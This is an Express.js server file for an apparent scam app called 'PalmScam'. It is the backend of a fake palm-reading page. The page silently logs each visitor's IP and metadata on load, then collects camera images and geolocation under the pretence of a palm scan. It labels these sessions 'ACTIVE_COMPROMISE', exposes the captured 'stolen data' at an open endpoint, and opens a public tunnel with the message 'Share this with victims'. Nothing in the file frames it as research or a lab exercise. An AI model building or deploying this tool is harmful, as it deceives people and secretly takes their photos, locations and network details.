const express = require('express');
const path = require('path');
const cors = require('cors');
const os = require('os'); // Added OS module to get local IPs
const localtunnel = require('localtunnel');

const app = express();
const PORT = process.env.PORT || 3000;

let publicUrl = '';

// Enable CORS and JSON parsing
app.use(cors());
app.use(express.json({ limit: '10mb' })); // Allow larger payloads for base64 images

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Simulated database
const capturedData = [];

// API Endpoint to get the server's local IP address / public URL
app.get('/api/server-info', (req, res) => {
    // If running on Vercel, use the Vercel URL
    if (process.env.VERCEL) {
        return res.json({
            ip: 'vercel',
            port: 443,
            url: `https://${process.env.VERCEL_URL}` // Vercel provides this automatically
        });
    }

    const defaultIP = 'localhost';
    let serverIP = defaultIP;

    // Find the current local network IP
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            // Skip over non-IPv4 and internal (i.e. 127.0.0.1) addresses
            if (iface.family === 'IPv4' && !iface.internal) {
                serverIP = iface.address;
                break; // Use the first suitable external IPv4 address
            }
        }
        if (serverIP !== defaultIP) break;
    }

    res.json({
        ip: serverIP,
        port: PORT,
        url: publicUrl || `http://${serverIP}:${PORT}`
    });
});

// API Endpoint to receive silent data on page load
app.post('/api/silent-log', (req, res) => {
    const { sessionId, metadata } = req.body;
    
    const entry = {
        sessionId: sessionId,
        timestamp: new Date().toISOString(),
        ip: req.ip,
        status: 'SILENT_CAPTURE',
        metadata: metadata || {}
    };
    
    capturedData.push(entry);
    console.log(`[!] SILENT CAPTURE from IP: ${entry.ip}`);
    
    res.json({ success: true });
});

// API Endpoint for Admin Dashboard to get stolen data
app.get('/api/data', (req, res) => {
    res.json(capturedData);
});

// API Endpoint to receive the "scanned" palm and active permissions
app.post('/api/analyze', (req, res) => {
    const { sessionId, image, metadata, location } = req.body;
    
    // Find the existing session created during silent capture
    const existingEntry = capturedData.find(e => e.sessionId === sessionId);
    
    if (existingEntry) {
        existingEntry.status = 'ACTIVE_COMPROMISE';
        existingEntry.metadata.cameraImage = !!image; // Just log that we got it to avoid huge memory usage, or save base64
        existingEntry.base64Image = image; 
        existingEntry.location = location;
        existingEntry.timestamp = new Date().toISOString(); // Update time
        console.log(`[!!!] ACTIVE COMPROMISE upgraded for IP: ${existingEntry.ip}`);
    } else {
        // Fallback if silent log didn't run
        capturedData.push({
            sessionId: sessionId || Date.now().toString(),
            timestamp: new Date().toISOString(),
            ip: req.ip,
            status: 'ACTIVE_COMPROMISE',
            base64Image: image,
            location: location,
            metadata: metadata || {}
        });
        console.log(`[!!!] ACTIVE COMPROMISE (New Session) for IP: ${req.ip}`);
    }
    
    console.log(`[+] Active flow completed for: ${req.ip}`);

    // Return a fake palm reading analysis
    const readings = [
        "Your life line is incredibly strong, suggesting a long journey filled with unexpected adventures.",
        "A deep heart line indicates you are passionate and deeply empathetic towards others.",
        "Your fate line is clear and unbroken—success in your career is very likely.",
        "The head line shows great analytical skills and a practical approach to problem-solving.",
        "Your sun line suggests you will achieve recognition and fame in your chosen field."
    ];
    
    const randomReading = readings[Math.floor(Math.random() * readings.length)];

    res.json({
        success: true,
        reading: randomReading,
        message: "Analysis complete."
    });
});

// Only start the local server & tunnel if NOT running on Vercel
if (!process.env.VERCEL) {
    app.listen(PORT, async () => {
        console.log(`PalmScam server running at http://localhost:${PORT}`);
        console.log(`Serving static files from ${path.join(__dirname, 'public')}`);
        
        try {
            const tunnel = await localtunnel({ port: PORT });
            publicUrl = tunnel.url;
            console.log(`\n======================================================`);
            console.log(`🌍 PUBLIC URL (Share this with victims): ${tunnel.url}`);
            console.log(`======================================================\n`);
            
            tunnel.on('close', () => {
                console.log('Tunnel closed');
            });
        } catch (err) {
            console.error("Failed to start local tunnel:", err);
        }
    });
}

// Export the Express API for Vercel
module.exports = app;
